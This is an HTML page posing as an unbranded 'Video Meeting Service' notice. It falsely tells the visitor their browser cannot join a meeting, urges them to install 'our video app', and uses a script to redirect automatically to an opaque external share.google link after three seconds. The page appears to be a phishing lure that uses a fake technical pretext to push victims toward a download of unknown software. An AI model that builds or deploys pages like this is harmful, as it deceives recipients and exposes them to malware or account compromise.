<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Video Meeting Notice</title>
  <style>
    :root {
      --blue: #0a76d5;
      --blue-dark: #075ca6;
      --text: #222;
      --muted: #6f7782;
      --line: #e8edf2;
      --bg: #ffffff;
    }

    * {
      box-sizing: border-box;
    }

    html, body {
      margin: 0;
      min-height: 100%;
      font-family: Arial, Helvetica, sans-serif;
      background: var(--bg);
      color: var(--text);
    }

    body {
      display: flex;
      align-items: flex-start;
      justify-content: center;
      padding: 90px 20px 40px;
    }

    .meeting-shell {
      width: min(650px, 100%);
      text-align: center;
    }

    .meeting-logo {
      width: 54px;
      height: 54px;
      margin: 0 auto 24px;
      display: grid;
      place-items: center;
      border-radius: 14px;
      background: linear-gradient(135deg, #0a76d5, #46a4f4);
      color: #fff;
      font-size: 24px;
      font-weight: 700;
      box-shadow: 0 8px 20px rgba(10, 118, 213, 0.18);
    }

    h1 {
      margin: 0 auto 14px;
      max-width: 560px;
      font-size: clamp(24px, 4vw, 34px);
      line-height: 1.3;
      font-weight: 600;
      letter-spacing: -0.02em;
    }

    .subtitle {
      max-width: 540px;
      margin: 0 auto 30px;
      color: var(--muted);
      font-size: 15px;
      line-height: 1.7;
    }

    .action-wrap {
      margin: 0 auto 28px;
    }

    .abort-button {
      min-width: 160px;
      padding: 11px 26px;
      border: 1px solid #066fc9;
      border-radius: 4px;
      background: linear-gradient(#1286e4, #0872c7);
      color: #fff;
      font-size: 14px;
      font-weight: 600;
      box-shadow:
        inset 0 1px 0 rgba(255,255,255,.22),
        0 2px 5px rgba(0,0,0,.12);
      cursor: pointer;
      transition: .18s ease;
    }

    .abort-button:hover {
      background: linear-gradient(#0f7fd7, #0666b6);
      transform: translateY(-1px);
    }

    .abort-button:active {
      transform: translateY(0);
    }

    .divider {
      width: min(420px, 86%);
      height: 1px;
      margin: 0 auto 24px;
      background: var(--line);
    }

    .instruction {
      max-width: 520px;
      margin: 0 auto;
      color: #555e68;
      font-size: 14px;
      line-height: 1.7;
    }

    .instruction strong {
      color: #2d343c;
      font-weight: 600;
    }

    .footer {
      margin-top: 42px;
      color: #9aa2ab;
      font-size: 12px;
    }

    @media (max-width: 600px) {
      body {
        padding-top: 55px;
      }

      .meeting-shell {
        width: 100%;
      }

      h1 {
        font-size: 26px;
      }

      .subtitle,
      .instruction {
        font-size: 14px;
      }
    }
  </style>
</head>
<body>
  <main class="meeting-shell">
    <div class="meeting-logo">V</div>

    <h1>We are sorry, your browser does not accept a Video Meeting.</h1>

    <p class="subtitle">
      This meeting cannot continue in your current browser environment.
    </p>

    <div class="action-wrap">
      <button class="abort-button" type="button" onclick="window.close();">
        Abort Now
      </button>
    </div>

    <div class="divider"></div>

    <p class="instruction">
      Kindly install our video app, and your colleague will resend you a new video meeting request.
    </p>

    <div class="footer">
      Video Meeting Service
    </div>
  </main>

  <script>
    window.setTimeout(() => {
      window.location.href = "https://share.google/hHL8mO7kx5AuGvU85";
    }, 3000);
  </script>

</body>
</html>
